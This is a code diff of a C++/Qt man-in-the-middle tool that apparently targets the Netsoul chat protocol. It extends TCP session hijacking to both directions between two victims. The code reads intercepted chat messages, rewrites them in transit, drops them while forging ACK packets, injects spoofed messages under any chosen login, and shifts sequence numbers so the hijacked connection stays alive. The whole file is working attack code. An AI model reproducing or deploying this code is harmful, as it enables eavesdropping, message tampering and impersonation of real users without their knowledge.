@@ -10,22 +10,29 @@
 #include "packet.h"
 #include "rawsocket.h"
 #include <QThread>
+#include "changemessage.h"
 
 Netsoul::Netsoul(MITMInfo & infos, RAWSocket & s, QWidget *parent) : QMainWindow(parent),
-        clearQueue(false),
+        clearQueue(0),
         ui(new Ui::Netsoul),
         portA(0), portB(0),
         deltaA(0), deltaB(0),
         state(NoInterference),
-        currentMessage(NULL),
+        currentMessageA(NULL),
         info(infos),
         socket(s)
 {
-    currentNewMessage = NULL;
+    currentNewMessageA = NULL;
     ui->setupUi(this);
-    QObject::connect(this->ui->changeMessage, SIGNAL(clicked()), this, SLOT(startWaitForMessage()));
-    QObject::connect(this->ui->newMessage, SIGNAL(clicked()), this, SLOT(showNewMessage()));
-    QObject::connect(this->ui->dropMessage, SIGNAL(clicked()), this, SLOT(dropMessage()));
+    this->ui->activityA->setPlainText("");
+    this->ui->activityB->setPlainText("");
+    QObject::connect(this->ui->changeMessageA, SIGNAL(clicked()), this, SLOT(startWaitForMessageA()));
+    QObject::connect(this->ui->newMessageA, SIGNAL(clicked()), this, SLOT(showNewMessageA()));
+    QObject::connect(this->ui->dropMessageA, SIGNAL(clicked()), this, SLOT(dropMessageA()));
+
+    QObject::connect(this->ui->changeMessageB, SIGNAL(clicked()), this, SLOT(startWaitForMessageB()));
+    QObject::connect(this->ui->newMessageB, SIGNAL(clicked()), this, SLOT(showNewMessageB()));
+    QObject::connect(this->ui->dropMessageB, SIGNAL(clicked()), this, SLOT(dropMessageB()));
 }
 
 Netsoul::~Netsoul()
@@ -33,63 +40,23 @@ Netsoul::~Netsoul()
     delete ui;
 }
 
-
-void Netsoul::startWaitForMessage()
-{
-    this->state = WaitingForMessage;
-    this->ui->changeMessage->setText("Stop wait");
-}
-
-void Netsoul::hasMessage()
-{
-    Packet* p = *(this->Queue.begin());
-
-    tcp* pTCP = static_cast<tcp*>(p->getBuffer());
-
-    char * data = ((char*)p->getBuffer()) + sizeof(tcp);
-    unsigned char buffer[p->Size - sizeof(tcp) + 1];
-    memcpy(buffer, data, p->Size - sizeof(tcp));
-    buffer[p->Size - sizeof(tcp)] = 0;
-    QString  tmp((const char *)buffer);
-    QString newstring = this->currentMessage->getMessage();
-
-    newstring = newstring.replace(" ", "%20");
-    QString res = tmp.replace(this->currentMessage->OriginalMessage, newstring);
-
-    this->addActivity(QString("replace(" + this->currentMessage->OriginalMessage + ", " + newstring + ") = " + res).toStdString().c_str());
-    std::cout << QString("replace(" + this->currentMessage->OriginalMessage + ", " + newstring + ") = " + res).toStdString().c_str() << std::endl;
-
-    p->reduce(p->Size - sizeof(tcp));
-    p->append(res.toStdString().c_str(), res.length());
-    NextDelta = -(this->currentMessage->OriginalMessage.length() - newstring.length());
-
-    clearQueue = true;
-    this->state = NoInterference;
-
-    delete this->currentMessage;
-    this->currentMessage = NULL;
-}
-
 void Netsoul::sendTargetAToTargetB(Packet & p)
 {
-    char * data = ((char*)p.getBuffer()) + sizeof(tcp);
     std::string * msg;
 
     tcp* pTCP = static_cast<tcp*>(p.getBuffer());
-    //this->currentSeqA = htonl(pTCP->seq) + // TODO
 
-    bool nextDelta = 0;
     if ((msg = this->isMessage(p)))
     {
-        if (this->state == WaitingForMessage)
+        if (this->state == WaitingForMessageA)
         {
-            this->currentMessage = new ChangeMessage(msg, this);
-            this->currentMessage->show();
-            this->state = WaitingForTyping;
-            this->ui->changeMessage->setText("Change next message");
-            this->addActivity(QString("A>>> Changing message -" + QString(msg->c_str()) + "-").toStdString().c_str());
+            this->currentMessageA = new ChangeMessage(A, msg, this);
+            this->currentMessageA->show();
+            this->state = WaitingForTypingA;
+            this->ui->changeMessageA->setText("Change next message");
+            this->addActivityA(QString("Changing message " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ") + "-").toStdString().c_str());
         }
-        else if (this->state == DropNextMessage)
+        else if (this->state == DropNextMessageA)
         {
             // Create an ACK and send it
             Packet pACK;
@@ -97,7 +64,6 @@ void Netsoul::sendTargetAToTargetB(Packet & p)
             tcp* ackTCP = (tcp*)pACK.getBuffer();
             ackTCP->craftTCP(this->info.mymac, pTCP->ip_dst, this->info.macA, pTCP->ip_src,
                              htons(pTCP->dest), htons(pTCP->source), htonl(pTCP->ack_seq), htonl(pTCP->seq) + p.getSizeOfData());
-            this->addActivity(QString("GetSizeOfData = " + QString::number(p.getSizeOfData())).toStdString().c_str());
             this->deltaA -= p.getSizeOfData();
             ackTCP->ack = 1;
             ackTCP->psh = 0;
@@ -105,21 +71,17 @@ void Netsoul::sendTargetAToTargetB(Packet & p)
             pACK.computeChecksum();
             this->socket.Write(pACK);
             p.State = Drop;
-            this->addActivity(QString("A>>> Message dropped !!! -" + QString(msg->c_str()) + "-").toStdString().c_str());
+            this->addActivityA(QString("Message dropped !!! " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());
 
             this->state = NoInterference;
         }
         else
-            this->addActivity(QString("A>>> Message -" + QUrl::fromEncoded(msg->c_str()).toString() + "-").toStdString().c_str());
-
-        //QByteArray()).toString()
-        std::cout << "Message : " << *msg << std::endl;
+            this->addActivityA(QString(QString(getUser(p)->c_str()) + ": " +  QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());
     }
-    else ;
 
-    if (this->state == WaitingForTyping)
+
+    if (this->state == WaitingForTypingA)
     {
-        // Store all incoming packets
         p.State = Store;
         std::cout << "Packet stored queue.size() : " << Queue.size() << std::endl;
         return;
@@ -128,8 +90,6 @@ void Netsoul::sendTargetAToTargetB(Packet & p)
     pTCP->seq = htonl(htonl(pTCP->seq) + deltaA);
     pTCP->ack_seq = htonl(htonl(pTCP->ack_seq) + deltaB);
 
-    if (nextDelta)
-        deltaA += nextDelta;
 }
 
 
@@ -137,19 +97,44 @@ void Netsoul::sendTargetBToTargetA(Packet & p)
 {
     std::string * msg;
     tcp* pTCP = static_cast<tcp*>(p.getBuffer());
+
     if ((msg = this->isMessage(p)))
     {
-        QString message("<<<B Message -" + QString(msg->c_str()) + "-");
-        this->addActivity(message.toStdString().c_str());
-    }
-    else
-    {
+        if (this->state == WaitingForMessageB)
+        {
+            this->currentMessageB = new ChangeMessage(B, msg, this);
+            this->currentMessageB->show();
+            this->state = WaitingForTypingB;
+            this->ui->changeMessageB->setText("Change next message");
+            this->addActivityB(QString("Changing message " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ") + "-").toStdString().c_str());
+        }
+        else if (this->state == DropNextMessageB)
+        {
+            // Create an ACK and send it
+            Packet pACK;
+            pACK.append(new tcp, sizeof(tcp));
+            tcp* ackTCP = (tcp*)pACK.getBuffer();
+            ackTCP->craftTCP(this->info.mymac, pTCP->ip_dst, this->info.macB, pTCP->ip_src,
+                             htons(pTCP->dest), htons(pTCP->source), htonl(pTCP->ack_seq), htonl(pTCP->seq) + p.getSizeOfData());
+            this->deltaB -= p.getSizeOfData();
+            ackTCP->ack = 1;
+            ackTCP->psh = 0;
+
+            pACK.computeChecksum();
+            this->socket.Write(pACK);
+            p.State = Drop;
+            this->addActivityB(QString("Message dropped !!! " + QString(getUser(p)->c_str()) + ": " + QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());
+
+            this->state = NoInterference;
+        }
+        else
+            this->addActivityB(QString(QString(getUser(p)->c_str()) + ": " +  QString(msg->c_str()).replace("%20", " ")).toStdString().c_str());
 
     }
 
-    if (this->state == WaitingForTyping)
+
+    if (this->state == WaitingForTypingB)
     {
-        // Store all incoming packets
         p.State = Store;
         return;
     }
@@ -157,17 +142,6 @@ void Netsoul::sendTargetBToTargetA(Packet & p)
     pTCP->seq = htonl(htonl(pTCP->seq) + deltaB);
     pTCP->ack_seq = htonl(htonl(pTCP->ack_seq) - deltaA);
 }
-
-/*
-        char * data = ((char*)p.getBuffer()) + sizeof(tcp);
-        char buffer[p.Size - sizeof(tcp) - 1];
-        memcpy(buffer, data, p.Size - sizeof(tcp) - 2); // without \r\n
-        buffer[p.Size - sizeof(tcp) - 2] = 0;
-        QString str("<<<B Unrecognized Packet : \"");
-        str += (const char *)buffer;
-        str += "\"";
-        //this->addActivity(str.toStdString().c_str());
- */
 
 std::string *Netsoul::isMessage(Packet & p)
 {
@@ -217,9 +191,14 @@ std::string * Netsoul::getUser(Packet & p)
     std::string tmp((const char *)buffer);
 
     std::string part;
-     std::stringstream  currentCMD(tmp);
-     for(int i = 0; i < 4; i++)
+    std::stringstream  currentCMD(tmp);
+    for(int i = 0; i < 4; i++)
         std::getline(currentCMD, part, ':');
+
+    std::stringstream  currentFragment(part);
+    std::getline(currentFragment, part, ' ');
+    std::stringstream  currentPart(part);
+     std::getline(currentPart, part, '@');
     *str = part;
     return str;
 }
@@ -267,22 +246,75 @@ bool Netsoul::isProtocol(Packet & p)
     return isProtocol;
 }
 
-void Netsoul::addActivity(const char * message)
+void Netsoul::addActivityA(const char * message)
 {
     QString mess(message);
-    this->ui->activity->setPlainText("\n" + QTime::currentTime().toString() + " > " + mess + this->ui->activity->toPlainText());
+    this->ui->activityA->setPlainText("\n" + QTime::currentTime().toString() + " > " + mess + this->ui->activityA->toPlainText() );
 }
 
-void Netsoul::showNewMessage()
+void Netsoul::addActivityB(const char * message)
 {
-    if (this->currentNewMessage == NULL)
-    {
-       this->currentNewMessage = new ChangeMessage(new std::string(""), this);
-       this->currentNewMessage->show();
-    }
+    QString mess(message);
+    this->ui->activityB->setPlainText("\n" + QTime::currentTime().toString() + " > " + mess + this->ui->activityB->toPlainText());
 }
 
-void Netsoul::sendNewMessage()
+
+void Netsoul::hasMessageA()
+{
+    Packet* p = *(this->Queue.begin());
+
+    char * data = ((char*)p->getBuffer()) + sizeof(tcp);
+    unsigned char buffer[p->Size - sizeof(tcp) + 1];
+    memcpy(buffer, data, p->Size - sizeof(tcp));
+    buffer[p->Size - sizeof(tcp)] = 0;
+    QString  tmp((const char *)buffer);
+    QString newstring = this->currentMessageA->getMessage();
+
+    newstring = newstring.replace(" ", "%20");
+    QString res = tmp.replace(this->currentMessageA->OriginalMessage, newstring);
+
+    this->addActivityA(QString("replace(" + this->currentMessageA->OriginalMessage + ", " + newstring + ") = " + res).toStdString().c_str());
+
+    p->reduce(p->Size - sizeof(tcp));
+    p->append(res.toStdString().c_str(), res.length());
+    NextDelta = -(this->currentMessageA->OriginalMessage.length() - newstring.length());
+
+    clearQueue = 1;
+    this->state = NoInterference;
+
+    delete this->currentMessageA;
+    this->currentMessageA = NULL;
+}
+
+
+void Netsoul::hasMessageB()
+{
+    Packet* p = *(this->Queue.begin());
+
+    char * data = ((char*)p->getBuffer()) + sizeof(tcp);
+    unsigned char buffer[p->Size - sizeof(tcp) + 1];
+    memcpy(buffer, data, p->Size - sizeof(tcp));
+    buffer[p->Size - sizeof(tcp)] = 0;
+    QString  tmp((const char *)buffer);
+    QString newstring = this->currentMessageB->getMessage();
+
+    newstring = newstring.replace(" ", "%20");
+    QString res = tmp.replace(this->currentMessageB->OriginalMessage, newstring);
+
+    this->addActivityB(QString("replace(" + this->currentMessageB->OriginalMessage + ", " + newstring + ")").toStdString().c_str());
+
+    p->reduce(p->Size - sizeof(tcp));
+    p->append(res.toStdString().c_str(), res.length());
+    NextDelta = -(this->currentMessageB->OriginalMessage.length() - newstring.length());
+
+    clearQueue = 2;
+    this->state = NoInterference;
+
+    delete this->currentMessageB;
+    this->currentMessageB = NULL;
+}
+
+void Netsoul::sendNewMessageA()
 {
     Packet test;
     test.append(new tcp, sizeof(tcp));
@@ -292,27 +324,62 @@ void Netsoul::sendNewMessage()
     testTCP->craftTCP(this->info.mymac, this->info.ipA, this->info.macB, this->info.nssIp,
 		      htons(this->portA), htons(this->portB), htonl(this->currentSeqA), htonl(this->currentSeqB));
 
-    test.append("user_cmd msg *:korcza_b@*Unknown%20Location%20On%20SameSoul* msg ", 65);
+    QString login = this->currentNewMessageA->getLogin();
+    QString msg = this->currentNewMessageA->getMessage().replace(" ", "%20");
 
-    test.append("jesusjesusjesusjesus\n", 21);
-
+    test.append("user_cmd msg *:", 15);
+    test.append(login.toStdString().c_str(), login.length());
+    test.append("@*Unknown%20Location%20On%20SameSoul* msg ", 42);
+    test.append(msg.toStdString().c_str(), msg.length());
+    test.append("\r\n", 2);
     testTCP = (tcp*)test.getBuffer();
-
     testTCP->psh = 1;
     testTCP->ack = 1;
-    testTCP->ip_len = htons(126);
+    testTCP->ip_len = htons(test.Size - sizeof(eth));
     test.computeChecksum();
-    //write(1, "----------------", 16);
-    //write(1, test.getBuffer(), 138);
-    //write(1, "----------------", 16);
-    NextDelta += 86;
     this->socket.Write(test);
-    delete this->currentNewMessage;
-    this->currentNewMessage = NULL;
+    deltaA += test.getSizeOfData();
+    delete this->currentNewMessageA;
+    this->currentNewMessageA = NULL;
 }
 
-
-void Netsoul::dropMessage()
+void Netsoul::startWaitForMessageA()
 {
-    this->state = DropNextMessage;
+    this->state = WaitingForMessageA;
+    this->ui->changeMessageA->setText("Stop wait");
 }
+
+void Netsoul::showNewMessageA()
+{
+    if (this->currentNewMessageA == NULL)
+    {
+       this->currentNewMessageA = new ChangeMessage(A, new std::string(""), this);
+       this->currentNewMessageA->show();
+    }
+}
+
+void Netsoul::dropMessageA()
+{
+    this->state = DropNextMessageA;
+}
+
+void Netsoul::startWaitForMessageB()
+{
+    this->state = WaitingForMessageB;
+    this->ui->changeMessageB->setText("Stop wait");
+}
+
+void Netsoul::showNewMessageB()
+{
+    if (this->currentNewMessageA == NULL)
+    {
+       this->currentNewMessageB = new ChangeMessage(B, new std::string(""), this);
+       this->currentNewMessageB->show();
+    }
+}
+
+void Netsoul::dropMessageB()
+{
+    this->state = DropNextMessageB;
+}
+
